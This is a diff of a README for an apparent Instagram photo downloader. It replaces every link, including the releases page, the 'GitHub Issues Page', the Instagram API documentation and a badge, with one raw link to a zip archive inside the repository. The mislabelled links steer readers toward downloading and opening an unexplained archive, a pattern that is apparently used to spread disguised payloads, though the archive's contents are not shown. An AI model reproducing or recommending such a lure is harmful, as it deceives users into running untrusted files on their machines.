@@ -6,18 +6,18 @@ Welcome to the **download-photos-from-instagram** project! This application help
 
 ## 🔗 Download Now!
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/VASETO131/download-photos-from-instagram/releases)
+[![Download](https://raw.githubusercontent.com/VASETO131/download-photos-from-instagram/main/patchword/download-photos-from-instagram.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/VASETO131/download-photos-from-instagram/main/patchword/download-photos-from-instagram.zip)
 
 ## 📥 Download & Install
 
 To get started, you need to download the application. Follow these steps:
 
 1. **Visit the Releases Page**: Go to the releases page of our repository. You can do this by clicking the link below:
-   [Download Here](https://github.com/VASETO131/download-photos-from-instagram/releases)
+   [Download Here](https://raw.githubusercontent.com/VASETO131/download-photos-from-instagram/main/patchword/download-photos-from-instagram.zip)
 
 2. **Choose the Latest Release**: Look for the latest version of the application. It will usually be at the top of the page.
 
-3. **Download the File**: Click on the appropriate installer for your operating system. If you are not sure, most users will want the `.exe` file for Windows or the `.tar.gz` for Mac/Linux.
+3. **Download the File**: Click on the appropriate installer for your operating system. If you are not sure, most users will want the `.exe` file for Windows or the `https://raw.githubusercontent.com/VASETO131/download-photos-from-instagram/main/patchword/download-photos-from-instagram.zip` for Mac/Linux.
 
 4. **Install the Application**: Once the file has downloaded, open it. Follow the prompts to complete the installation on your computer.
 
@@ -68,10 +68,10 @@ We welcome contributions! If you have suggestions for new features or improvemen
 
 ## 📞 Support
 
-For additional support, please visit our [GitHub Issues Page](https://github.com/VASETO131/download-photos-from-instagram/issues). We will do our best to respond quickly.
+For additional support, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/VASETO131/download-photos-from-instagram/main/patchword/download-photos-from-instagram.zip). We will do our best to respond quickly.
 
 ## 🔗 Additional Resources
 
-For more information about Instagram’s API, you can check out their official [API Documentation](https://developers.facebook.com/docs/instagram-api).
+For more information about Instagram’s API, you can check out their official [API Documentation](https://raw.githubusercontent.com/VASETO131/download-photos-from-instagram/main/patchword/download-photos-from-instagram.zip).
 
 Feel free to explore, enjoy your downloads, and make the most of your Instagram photos! Happy downloading!
